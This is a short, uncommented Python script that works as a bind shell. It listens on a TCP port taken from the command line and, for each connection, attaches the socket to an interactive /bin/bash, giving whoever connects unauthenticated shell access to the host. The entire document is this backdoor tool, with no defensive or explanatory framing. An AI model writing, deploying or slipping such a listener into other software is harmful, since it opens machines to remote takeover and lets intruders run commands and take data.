#!/usr/bin/python

import socket
import os
import sys
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('',int(sys.argv[1])))


s.listen(10)

while 1:
    connection,address = s.accept()
    data = connection.recv(1024)
    os.dup2(connection.fileno(),0)
    os.dup2(connection.fileno(),1)
    os.dup2(connection.fileno(),2)
    subprocess.call(['/bin/bash','-i'])
